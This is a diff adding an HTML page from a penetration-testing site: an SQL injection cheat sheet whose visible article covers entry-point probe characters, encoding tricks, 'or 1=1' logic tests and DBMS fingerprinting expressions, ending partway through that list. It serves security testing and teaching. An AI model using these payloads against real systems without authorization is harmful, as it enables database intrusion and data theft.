@@ -1,0 +1,2167 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="All about SQL injection techniques, methods, payloads, how/why/when they work.">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="SQL Injection" />
+<meta property="og:description" content="All about SQL injection techniques, methods, payloads, how/why/when they work." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/sql_injection/" /><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2022-10-16T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-10-16T00:00:00+00:00" />
+<title>SQL Injection | Gray Hat Freelancing</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.afc3b3563d1884d85d5f5db04c9a930f7d7c354fdac44481534920d345015a5b.js" integrity="sha256-r8OzVj0YhNhdX12wTJqTD318NU/axESBU0kg00UBWls=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-124168691-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script><!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Gray Hat Freelancing</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+  
+
+
+
+  
+    
+  
+    
+  
+
+
+
+<ul class="book-languages">
+  <li>
+    <input type="checkbox" id="languages" class="toggle" />
+    <label for="languages" class="flex justify-between">
+      <a role="button" class="flex align-center">
+        <img src="/svg/translate.svg" class="book-icon" alt="Languages" />
+        English
+      </a>
+    </label>
+
+    <ul>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/ru/">
+          Russian
+        </a>
+      </li>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/zh/">
+          Chinese
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <a href="/docs/example/" class="">Example Site</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/" class="">Table of Contents</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/with-toc/" class="">With ToC</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/without-toc/" class="">Without ToC</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4e46b01272d410b3a99461d79326ddf4" class="toggle"  />
+    <label for="section-4e46b01272d410b3a99461d79326ddf4" class="flex justify-between">
+      <a role="button" class="">Collapsed</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/" class="">3rd Level</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/4th-level/" class="">4th Level</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/attacking_active_directory/" class="">Active Directory Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tryhackme_olympus/" class="">Olympus - TryHackMe Walkthrough</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/wordpress/" class="">Wordpress Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_hardening/" class="">Windows - Hardening</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_amsi_bypass/" class="">Bypassing AMSI protections</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/subdomains_enumeration/" class="">Enumerating Subdomains</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_mimikatz/" class="">Windows - Mimikatz</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_persistence/" class="">Windows - Persistence</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_privilege_escalation/" class="">Windows - Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_using_credentials/" class="">Windows - Using Credentials</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_download_and_execute/" class="">Windows Download and Execute Methods</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/escape_breakout/" class="">Application Escape and Breakout</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/office_attacks/" class="">Attacking Office</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/bind_shell_cheatsheet/" class="">Bind Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/methodology_and_enumeration/" class="">Bug Hunting Methodology and Enumeration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cobalt_strike_all_you_need/" class="">Cobalt Strike</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/hash_cracking/" class="">Hash Cracking Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/linux_persistence/" class="">Linux - Persistence</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/linux_privilege_escalation/" class="">Linux - Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/metasploit_cheatsheet/" class="">Metasploit</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_dpapi/" class="">Microsoft Window&#39;s Data Protection API</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/microsoft_azure_cloud/" class="">Microsoft&#39;s Azure Cloud</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/network_discovery/" class="">Network Discovery</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/network_pivoting_techniques/" class="">Network Pivoting Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/mssql_server_cheatsheet/" class="">Pentesting MSSQL Server Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/powershell_cheatsheet/" class="">Powershell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/reverse_shell_cheatsheet/" class="">Reverse Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/source_code_management/" class="">Source Code Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/docker_pentesting/" class="">Docker Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/miscellaneous_tricks/" class="">Miscellaneous Tips and Tricks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/graphql_injection/" class="">GraphQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csv_injection/" class="">Csv Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/checking_for_account_takeover/" class="">Account Takeovers</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/amazon_aws_s3_buckets/" class="">Amazon AWS S3 Buckets</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/api_key_leaks/" class="">API Key Leaks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/command_injection/" class="">Command Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cors_misconfigurations/" class="">CORS Misconfigurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/crlf_injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csrf_injection/" class="">CSRF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cve_exploits/" class="">CVE Exploits</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dependency_confusion_attacks/" class="">Dependency Confusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dns_rebinding/" class="">DNS Rebinding</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/file_inclusion/" class="">File Inclusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/http_parameter_pollution/" class="">HTTP Parameter Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_deserialization/" class="">Insecure Deserialization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_direct_object_references/" class="">Insecure Direct Object References</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_file_uploads/" class="">Insecure File Upload</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_management_interfaces/" class="">Insecure Management Interface</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_source_code_management/" class="">Insecure Source Code Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/java_rmi/" class="">Java RMI</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/json_web_token/" class="">JSON Web Tokens</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/kuburnetes/" class="">Kuburnetes</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/latex_injection/" class="">LaTeX Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ldap_injection/" class="">LDAP Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/nosql_injection/" class="">NoSQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/oauth/" class="">OAuth</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/open_url_redirection/" class="">Open URL Redirection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/race_conditions/" class="">Race Conditions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/request_smuggling/" class="">Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/saml_injection/" class="">SAML Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/server_side_request_forgery/" class="">Server-Side Request Forgery</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/server_side_template_injection/" class="">Server-Side Template Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/sql_injection/" class="active">SQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tabnabbing/" class="">Tabnabbing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/type_juggling/" class="">Type Juggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/web_cache_deception/" class="">Web Cache Deception</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/web_sockets/" class="">Web Sockets Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xxe_injection/" class="">XML eXternal Entity Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xpath_injection/" class="">XPATH Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xslt_injection/" class="">XSLT Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xss_injection/" class="">XSS Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <span>Shortcodes</span>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/buttons/" class="">Buttons</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/columns/" class="">Columns</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/details/" class="">Details</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/expand/" class="">Expand</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/hints/" class="">Hints</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/katex/" class="">Katex</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/mermaid/" class="">Mermaid</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="toggle"  />
+    <label for="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="flex justify-between">
+      <a href="/docs/shortcodes/section/" class="">Section</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/first-page/" class="">First Page</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/second-page/" class="">Second Page</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/tabs/" class="">Tabs</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/directory_traversal/" class="">Directory Traversal</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/posts/"  >
+        Blog
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/"  target="_blank" rel="noopener">
+        Github
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/grayhatfreelancing"  target="_blank" rel="noopener">
+        Contribute
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>SQL Injection</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#sql-injection">SQL injection</a>
+      <ul>
+        <li><a href="#entry-point-detection">Entry point detection</a></li>
+        <li><a href="#dbms-identification">DBMS Identification</a></li>
+        <li><a href="#sql-injection-using-sqlmap">SQL injection using SQLmap</a>
+          <ul>
+            <li><a href="#basic-arguments-for-sqlmap">Basic arguments for SQLmap</a></li>
+            <li><a href="#load-a-request-file-and-use-mobile-user-agent">Load a request file and use mobile user-agent</a></li>
+            <li><a href="#custom-injection-in-useragentheaderreferercookie">Custom injection in UserAgent/Header/Referer/Cookie</a></li>
+            <li><a href="#second-order-injection">Second order injection</a></li>
+            <li><a href="#shell">Shell</a></li>
+            <li><a href="#crawl-a-website-with-sqlmap-and-auto-exploit">Crawl a website with SQLmap and auto-exploit</a></li>
+            <li><a href="#using-tor-with-sqlmap">Using TOR with SQLmap</a></li>
+            <li><a href="#using-a-proxy-with-sqlmap">Using a proxy with SQLmap</a></li>
+            <li><a href="#using-chrome-cookie-and-a-proxy">Using Chrome cookie and a Proxy</a></li>
+            <li><a href="#using-suffix-to-tamper-the-injection">Using suffix to tamper the injection</a></li>
+            <li><a href="#general-tamper-option-and-tampers-list">General tamper option and tamper&rsquo;s list</a></li>
+            <li><a href="#sqlmap-without-sql-injection">SQLmap without SQL injection</a></li>
+          </ul>
+        </li>
+        <li><a href="#authentication-bypass">Authentication bypass</a></li>
+        <li><a href="#authentication-bypass-raw-md5-sha1">Authentication Bypass (Raw MD5 SHA1)</a></li>
+        <li><a href="#polyglot-injection-multicontext">Polyglot injection (multicontext)</a></li>
+        <li><a href="#routed-injection">Routed injection</a></li>
+        <li><a href="#insert-statement---on-duplicate-key-update">Insert Statement - ON DUPLICATE KEY UPDATE</a></li>
+        <li><a href="#waf-bypass">WAF Bypass</a>
+          <ul>
+            <li><a href="#white-spaces-alternatives">White spaces alternatives</a></li>
+            <li><a href="#no-comma">No Comma</a></li>
+            <li><a href="#no-equal">No Equal</a></li>
+            <li><a href="#case-modification">Case modification</a></li>
+            <li><a href="#obfuscation-by-dbms">Obfuscation by DBMS</a></li>
+            <li><a href="#more-mysql-specific">More MySQL specific</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="sql-injection">
+  SQL injection
+  <a class="anchor" href="#sql-injection">#</a>
+</h1>
+<blockquote>
+<p>A SQL injection attack consists of insertion or &ldquo;injection&rdquo; of a SQL query via the input data from the client to the application.</p>
+</blockquote>
+<p>Attempting to manipulate SQL queries may have goals including:</p>
+<ul>
+<li>Information Leakage</li>
+<li>Disclosure of stored data</li>
+<li>Manipulation of stored data</li>
+<li>Bypassing authorization controls</li>
+</ul>
+<h2 id="entry-point-detection">
+  Entry point detection
+  <a class="anchor" href="#entry-point-detection">#</a>
+</h2>
+<p>Detection of an SQL injection entry point
+Simple characters</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">%27
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">%22
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">%23
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">%3B
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Wildcard (*)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&amp;apos;  # required for XML content
+</span></span></span></code></pre></div><p>Multiple encoding</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">%%</span><span style="color:#ae81ff">2727</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#ae81ff">25</span><span style="color:#f92672">%</span><span style="color:#ae81ff">27</span>
+</span></span></code></pre></div><p>Merging characters</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">`+</span>HERP
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;||&#39;</span>DERP
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;+&#39;</span>herp
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39; &#39;</span>DERP
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;%20&#39;</span>HERP
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;%2B&#39;</span>HERP
+</span></span></code></pre></div><p>Logic Testing</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>page.asp<span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">or</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#75715e">-- true
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>page.asp<span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; or 1=1 -- true
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">page.asp?id=1&#34; or 1=1 -- true
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">page.asp?id=1 and 1=2 -- false
+</span></span></span></code></pre></div><p>Weird characters</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>Unicode character U<span style="color:#f92672">+</span><span style="color:#ae81ff">02</span>BA MODIFIER LETTER DOUBLE PRIME (encoded <span style="color:#66d9ef">as</span> <span style="color:#f92672">%</span>CA<span style="color:#f92672">%</span>BA) was
+</span></span><span style="display:flex;"><span>transformed <span style="color:#66d9ef">into</span> U<span style="color:#f92672">+</span><span style="color:#ae81ff">0022</span> QUOTATION MARK (<span style="color:#e6db74">&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">transformed into U+0027 APOSTROPHE (&#39;)
+</span></span></span></code></pre></div><h2 id="dbms-identification">
+  DBMS Identification
+  <a class="anchor" href="#dbms-identification">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;conv(&#39;a&#39;,16,2)=conv(&#39;a&#39;,16,2)&#34;</span>                   ,<span style="color:#e6db74">&#34;MYSQL&#34;</span>],
+</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;connection_id()=connection_id()&#34;</span>                 ,<span style="color:#e6db74">&#34;MYSQL&#34;</span>],
+</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;crc32(&#39;MySQL&#39;)=crc32(&#39;MySQL&#39;)&#34;</span>                   ,<span style="color:#e6db74">&#34;MYSQL&#34;</span>],
+</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)&#34;</span>       ,<span style="color:#e6db74">&#34;MSSQL&#34;</span>],
+</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;@@CONNECTIONS&gt;0&#34;</span>                                 ,<span style="color:#e6db74">&#34;MSSQL&#34;</span>],
+</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;@@CONNECTIONS=@@CONNECTIONS&#34;</span>                     ,<span style="color:#e6db74">&#34;MSSQL&#34;</span>],
+</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;@@CPU_BUSY=@@CPU_BUSY&#34;</span>                           ,<span style="color:#e6db74">&#34;MSSQL&#34;</span>],
+</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;USER_ID(1)=USER_ID(1)&#34;</span>                           ,<span style="color:#e6db74">&#34;MSSQL&#34;</span>],
+</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;ROWNUM=ROWNUM&#34;</span>                                   ,<span style="color:#e6db74">&#34;ORACLE&#34;</span>],
+</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;RAWTOHEX(&#39;AB&#39;)=RAWTOHEX(&#39;AB&#39;)&#34;</span>                   ,<span style="color:#e6db74">&#34;ORACLE&#34;</span>],
+</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;LNNVL(0=123)&#34;</span>                                    ,<span style="color:#e6db74">&#34;ORACLE&#34;</span>],
+</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;5::int=5&#34;</span>                                        ,<span style="color:#e6db74">&#34;POSTGRESQL&#34;</span>],
+</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;5::integer=5&#34;</span>                                    ,<span style="color:#e6db74">&#34;POSTGRESQL&#34;</span>],
+</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;pg_client_encoding()=pg_client_encoding()&#34;</span>       ,<span style="color:#e6db74">&#34;POSTGRESQL&#34;</span>],
+</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;get_current_ts_config()=get_current_ts_config()&#34;</span> ,<span style="color:#e6db74">&#34;POSTGRESQL&#34;</span>],
+</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;quote_literal(42.5)=quote_literal(42.5)&#34;</span>         ,<span style="color:#e6db74">&#34;POSTGRESQL&#34;</span>],
+</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;current_database()=current_database()&#34;</span>           ,<span style="color:#e6db74">&#34;POSTGRESQL&#34;</span>],
+</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;sqlite_version()=sqlite_version()&#34;</span>               ,<span style="color:#e6db74">&#34;SQLITE&#34;</span>],
